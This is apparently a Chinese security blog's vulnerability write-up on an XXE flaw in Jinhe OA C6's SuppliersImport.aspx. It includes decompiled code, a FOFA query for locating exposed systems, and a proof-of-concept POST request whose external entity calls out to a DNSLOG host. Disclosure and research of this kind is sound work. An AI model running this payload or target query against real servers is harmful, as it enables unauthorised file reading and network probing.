---
title: "金和OA SuppliersImport.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ContractManagement-SuppliersImport-xxe.html
asset_dir: assets/金和oa-suppliersimport.aspx-xxe漏洞
---

# 金和OA SuppliersImport.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/8 13:35
* 275浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

云安全解决方案

服务器安全服务

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `SuppliersImport.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `SuppliersImport.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ContractManagement.dll` 将其进行反编译后找到 **SuppliersImport** 的处理逻辑

深入探索

网页浏览器

文件大小转换

编程语言教程

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  ((Control) this).Page.Response.Write(this.ImportData());
  ((Control) this).Page.Response.End();
}
```

跟进 `ImportData` 方法

```
protected string ImportData()
{
  string str1 = string.Empty;
  DateTime now = DateTime.Now;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlNode documentElement = (XmlNode) xmlDocument.DocumentElement;
```

深入探索

恶意软件分析工具

漏洞扫描器

SQL注入检测工具

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.ContractManagement/Importing/SuppliersImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

[![金和OA SuppliersImport.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA SuppliersImport.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-ContractManagement-SuppliersImport-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-ContractManagement-SuppliersImport-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全研究工具

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALmUlEQVR4AeybAXIbuQ5E9fb+d94fqPeNSQwpydmspao/qiDNbjQwNDETWXblr9vt9vfvxN/t1XuYflXvPrl9xK7LR9Qrjrlx3fOdj95am+9YuQr1Wv9u1EB+1V5/PuUEjoH8mu7tlegbB25Alw/eex6Jby6A+3XsZ7l8RHMw14yeWsOch3Dry1MhFyE+CKp3rNpXYqw7BjKK1/p9J3AaCGTqMOOrW/SOgNRbBzNX72i9COs6iA5faC+I1jlEh6DX0CcXuw7rOn07hNTBjCv/aSAr06X93An85wOB3BX9S/Iu7KgP1nXmxbFerePoqbV5mK8Bj7l1HatnRdd/h//nA/mdTf0/1/zxgUDusrpjxvCQIXkIqosQfawd15B890N0wNRTtC8wfQcH4b2BfvXO1f8N/vGB/JvNXLW322kgTr3js8PSf/f9+gu433W/li/9ge/5vd4KvaA5+XdxVw9/Zq+r/ZwGsjJd2s+dwDEQyNThMb66Ne8uSD+59XJY5/VB8vKOkDzQUwcHvvW0HoX/LOBxPazzEB0e4z+XucMxkDu7/nr7CfzlnfpddOfWdQ65K9QhXD/MXN930X6Fz2oh19QHM1evXhWQfK0rIFyfWLmKzkv7blxPiKf4IXgaCKzvAogOa/TrgeS9M9R3HOLvPoje6/RB8nBGPTt8taf1kGvs6rqvc0g9rFF/4WkgJV7xvhN4eSDeHR371s13Hea7o+efcUi9Pq8zYs91rvdVvfsge7APhOvbof4dQvoA5w+Gt+v11hM4nhDIlPpuIDrMqM+py2HtM9/9nUPq9cPBlSaE5IHjN56TYSAQ7yC9tITUuVeY+a5J90Pqdv7Sj4EUueL9J/AXzFNzqm7tGdfX0bqOMF8PwiG466NuP4hfXgjR9EI4BNVFmPXqUQGzrl8sTwWsfbDWrRfh7LueEE/nQ/D4pO5+4Dy1ytUdUQHrfHkqylMBsw8e86pZBaTOXF1jDEgeGOVpba04JQcCTD/z6n6Y80Ppfdn9d3H4q+c7L+v1hNQpfFAcA1lNq/YJuSsgqA/CYY1V+yjss/NA+j7zjfV6IbXmIBxm7Hm5fXZ8p0P6Ww/h+iEcguojHgMZxWv9vhM4fZf1bCuQ6XoXiL1OHR779e3q1SF95Ks6iGeVq7qud16eMSD91LofHuf1d7QfzPWlX09IncIHxWkgTtM97jicp1s1+mHOw5rDa/qub13z1YBcy173ul9/dQ7x/Urd/0A4zGgdRL+bF39B8hC0boWngSz6XdIPnsAxEMj0nl0bXvPZp98F6qJ5SF+5eYgu73n1ESE1esXR82itX+zena4Pcn35M4T4geunvbcPex1PSJ86fE0NOLatTwSmT7cazcth7TOvH+KTixBdP4SbX2H3dg7poS7CrNv71bx+WPeBWbdv4TGQIle8/wROA4FMzyl3hOQh6JegD6JDsOfl30X7WyeHXAcwdSAwPb3WHIZ/FjD7/pHvtZAcoHxC4O41AeFeT4To+lZ4GsjKdGk/dwKnn/Z6aVhP02l3tO5VtF4/rK8H0WGN9im0l1jaGJAeavrErstFfR17Xg65HgStMy8f8XpCxtP4gPUxEMgUnZ4I0d0rhEOw6/IdwrrO64kQn7zjrv+oQ3qo2QOiy0WIrl+E6PpE8yLEB9zfU7qvc+vUC4+BmLzwvSdwDKSmU7HbDmT65anovtIqui6HuR7WHGbdehHmPIQDWg6s/VQA9zsWgqVVHMa2qFyFcq0r5CKkn1wsb0XnsPZDdOD6pH77sNfxhLgvyLTkHWHOw8z11x1SAXMeZq5frJoKOcQPwa7LCyEemLFyY0DyajBzdRGSh6B67bMCZh3CYcbyVkB0+4x4GsiYvNY/fwKngdQEK/pWSlvFzqe+qhm17pOLeuWi+gp3nq5D7tTeQ19HfZA6COoz39E8xG9eXV54GoimC99zAtvfqUOm2bcFr+kQHwTtA2sOs65frLunQi5C6gClA4H7d1cKVV8hF2H2qXeE+KrHGDtf161Rh/STF15PSJ3CB8U1kA8aRm1lO5B6vCrKNEZpFaP2nXXVVlhT6wo55DGGoPoOq9bonq5DekJQvz6YdfOiPjms/d3X/ZA6fRAOXB8Mbx/2evnH7/A1Rfha+/X0actF+KoBLLu/6cLXf7bRL2oE7t7OITp84c6j/qy3PkhP/RBuviMkDzPqs498hdt/slbmS/vvT+D4thfmqTpN0a10rg6pl+/wWT3MfSB8V6e+QvfQc5Ce5kV9chHi3+V3uvXmYd3HfOH1hHhqH4Kn95CaUgVkmhB0vxBengr1Wo+hLpqD1Kt33Plgrus+oLc6cWB6H7JHN0J8z/LWQfzyXgdzHtYcuL7Lun3Y6/gnq091x9UhU+4cokPw2ddrvT5IXdflIsRn3SOEeK0VrZHD7IPH3LpdH/WO1kH6j/ljIKN4rd93Asd3WX0LME8PwiH4aMq9V3Gw7u/7f/AvbRXf7au/EHINCK76jxo89lXPirFmXEPqy1Mx5sZ15caAfd31hIwn9wHr00Bgnt442XHd9z7mxjXM/SDcepi5ekd47huvW2t71LoC0gOCpVXoEyF5uVjeCrkI8UNQXYToEKweFTDz0k4DscmF7zmB0+eQvg3IFGFGfTXVCjnEJ69cBcy6ebE8FRBfrSt6Xv4KVn2F3lpXyP80Vu8x7K8mF9UhXzNwfQ65fdjr5e+ynKYIX1OFr/Uuv/u69Zt/xiHX0v8nEOaefQ+QPAS9Zvepw+xT3/nNF17vIXUKHxTHewhkqn2Kckgegup+LZ3vdH2QPhDUD+EQVO9on64Xh8e15RnjUa/ymRdLq4Bcp+uVq1CH+Ep7FtcT8uyEfjh/vIc4zX59yHTNizDrEN7rO4fZt+tnHcz+nV46zF6YeXkqvGatK2Dtg+gwY9WMAY/zeiG+zt1P4fWEeDofgsd7iPuBTLGmNcYur65X3tG8aB7m66nrEyG+npcX6q11hRxSCzOWZ4zul4+eWkP61LpCX0eIT728FRC91hUQDlyfQ24f9jr+yYJMyf3BmjttmPPWifrkED8E1btPHda+7of4AEvvP00u3yF8c1G1FcD9N4y1XsWuLaRul3+kHwN5ZLpyP3cCp4H0O6FvBebpQzis0fpdX0idPlhzmHX9Y1+IB2bU02s6h9R1XQ5zXn2HXhfWdebH+tNAxuS1/vkTOA0EMk0IuiWnKe70noe5D4Q/8+36qz/C3rt7IXtQh/BeB9Eh2PPWixDfjlsv6hvxNJAxea1//gSOT+r90rspwnwX9DpIflevH+KT7xDig+doD4j32R70dwTr17//h+Stg5mrd4T4INjzxa8npE7hg+L4pO7dJO72aF6ETBuCu7qdbp+eV++or+sj1wPznkZPrSH5WldYV+sKeJzXL1bNKsyLeuQjXk/IeBofsD7eQyB3A7yGu70/mn7VmBch15OXpwKi17oCZl5aBUQHij4M4P7JG4I7MyTvniBcP4SbVxcheXlH2OevJ6Sf1pv5MRCn/Qx3+7UO5unvdPv0vFzUt0N9hd1TWgVkT7Wu0FfrCkgegubhMdfXsXpWdF1euQr5iMdARvFav+8ETgOB3BUw426LNemKnofX6q2rHhWwrqtchX6YffDF9YhVVyF/huUdQ/+o1RpyTfMQDjOar5oKuViacRqIpgvfcwJ/fCBO+tmXA7mLnvnMw+xfXadrkBqYsfu8RtchdeZh5vqfYa+Xr/CPD2R1kUt7/QT+9UBgvmsgvN81uy1B/D1vvbpcVB8RHvfa1arDun68xqM1pB6COy/MeQgHrt+p3z7sdXpCvFs67vatDzLlnU8dHvvs98wP6aO/0JpajwHxQlCfCLMO4fbQJ0LyO24dzD510Xp54Wkgmi58zwkcA4FMEx7jbps13TH0QfqZU/9dhPRb1fdrQLxdX9WWpk8sbQx10Vzn6h0h+9npwPUecvuw1/GEfNi+/m+38z8AAAD//wOzGcwAAAAGSURBVAMAak9ZmAySS58AAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ContractManagement-SuppliersImport-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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